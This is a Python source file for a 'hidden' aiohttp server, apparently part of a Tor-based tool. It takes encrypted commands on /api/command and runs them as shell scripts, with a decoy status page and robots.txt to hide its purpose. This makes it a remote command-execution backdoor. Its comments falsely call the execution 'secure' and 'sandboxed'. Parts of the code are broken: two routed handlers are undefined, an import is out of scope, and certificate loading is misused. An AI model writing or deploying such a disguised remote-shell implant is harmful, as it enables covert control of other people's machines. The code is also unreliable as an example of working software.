import asyncio
import aiohttp
from aiohttp import web
import ssl
import json
import time
import random
from cryptography.fernet import Fernet
import base64
from hashlib import sha256
import os

class HiddenHTTPServer:
    def __init__(self, tor_manager, port=8080):
        self.tor_manager = tor_manager
        self.port = port
        self.app = web.Application()
        self.runner = None
        self.site = None
        self.encryption_key = self.generate_encryption_key()
        self.setup_routes()
        
    def generate_encryption_key(self):
        """Generate encryption key from system entropy"""
        entropy = os.urandom(32) + str(time.time()).encode()
        return Fernet(base64.b64encode(sha256(entropy).digest()))
    
    def setup_routes(self):
        """Setup encrypted API endpoints"""
        self.app.router.add_post('/api/secure', self.handle_secure_message)
        self.app.router.add_get('/api/status', self.handle_status)
        self.app.router.add_get('/api/identity', self.handle_identity)
        self.app.router.add_post('/api/command', self.handle_command)
        
        # Add decoy routes
        self.app.router.add_get('/', self.decoy_homepage)
        self.app.router.add_get('/robots.txt', self.decoy_robots)
        
    async def handle_secure_message(self, request):
        """Handle encrypted messages"""
        try:
            data = await request.read()
            decrypted = self.encryption_key.decrypt(data)
            message = json.loads(decrypted)
            
            # Process message
            response = {
                'status': 'received',
                'timestamp': time.time(),
                'message_id': sha256(str(time.time()).encode()).hexdigest()[:16]
            }
            
            encrypted_response = self.encryption_key.encrypt(
                json.dumps(response).encode()
            )
            
            return web.Response(body=encrypted_response)
            
        except Exception as e:
            error_msg = self.encryption_key.encrypt(
                json.dumps({'error': 'decryption_failed'}).encode()
            )
            return web.Response(body=error_msg, status=400)
    
    async def handle_command(self, request):
        """Handle encrypted commands"""
        try:
            data = await request.read()
            decrypted = self.encryption_key.decrypt(data)
            command = json.loads(decrypted)
            
            # Execute command securely
            result = await self.execute_secure_command(command)
            
            encrypted_result = self.encryption_key.encrypt(
                json.dumps(result).encode()
            )
            
            return web.Response(body=encrypted_result)
            
        except Exception as e:
            return web.Response(status=400)
    
    async def execute_secure_command(self, command):
        """Execute command in isolated environment"""
        # Command execution with sandboxing
        import subprocess
        import tempfile
        
        with tempfile.TemporaryDirectory() as tmpdir:
            # Write command to temporary script
            script_path = os.path.join(tmpdir, 'command.sh')
            with open(script_path, 'w') as f:
                f.write(command.get('cmd', ''))
            
            # Execute with timeout
            try:
                proc = await asyncio.create_subprocess_shell(
                    f"timeout 30 {script_path}",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                
                stdout, stderr = await proc.communicate()
                
                return {
                    'exit_code': proc.returncode,
                    'stdout': stdout.decode('utf-8', errors='ignore'),
                    'stderr': stderr.decode('utf-8', errors='ignore')
                }
                
            except asyncio.TimeoutError:
                return {'error': 'timeout'}
    
    async def decoy_homepage(self, request):
        """Return decoy homepage"""
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>System Status Monitor</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; }
                .container { max-width: 800px; margin: 0 auto; }
                .status { color: green; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>System Status Monitor</h1>
                <p>All systems operational.</p>
                <p class="status">● Online</p>
                <p>Last updated: """ + time.strftime("%Y-%m-%d %H:%M:%S") + """</p>
            </div>
        </body>
        </html>
        """
        return web.Response(text=html, content_type='text/html')
    
    async def decoy_robots(self, request):
        """Return decoy robots.txt"""
        return web.Response(text="User-agent: *\nDisallow: /admin/\nDisallow: /private/")
    
    def start(self):
        """Start the hidden server"""
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # Generate self-signed SSL certificate
        ssl_context = self.generate_ssl_context()
        
        # Start server
        self.runner = web.AppRunner(self.app)
        loop.run_until_complete(self.runner.setup())
        
        self.site = web.TCPSite(
            self.runner, 
            '127.0.0.1', 
            self.port,
            ssl_context=ssl_context
        )
        
        loop.run_until_complete(self.site.start())
        
        print(f"[SERVER] Hidden service started on port {self.port}")
        print(f"[SERVER] Tor hidden service available")
        
        # Keep running
        loop.run_forever()
    
    def generate_ssl_context(self):
        """Generate self-signed SSL certificate"""
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.primitives import serialization
        import datetime
        
        # Generate key
        key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
        )
        
        # Generate certificate
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "California"),
            x509.NameAttribute(NameOID.LOCALITY_NAME, "San Francisco"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Example Corp"),
            x509.NameAttribute(NameOID.COMMON_NAME, "localhost"),
        ])
        
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.datetime.utcnow()
        ).not_valid_after(
            datetime.datetime.utcnow() + datetime.timedelta(days=365)
        ).add_extension(
            x509.SubjectAlternativeName([x509.DNSName("localhost")]),
            critical=False,
        ).sign(key, hashes.SHA256())
        
        # Create SSL context
        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ssl_context.load_cert_chain(
            certfile=self.cert_to_bytes(cert),
            keyfile=self.key_to_bytes(key)
        )
        
        return ssl_context
    
    def cert_to_bytes(self, cert):
        """Convert certificate to bytes"""
        return cert.public_bytes(serialization.Encoding.PEM)
    
    def key_to_bytes(self, key):
        """Convert key to bytes"""
        return key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        )
    
    def stop(self):
        """Stop the server"""
        if self.runner:
            loop = asyncio.get_event_loop()
            loop.run_until_complete(self.runner.cleanup())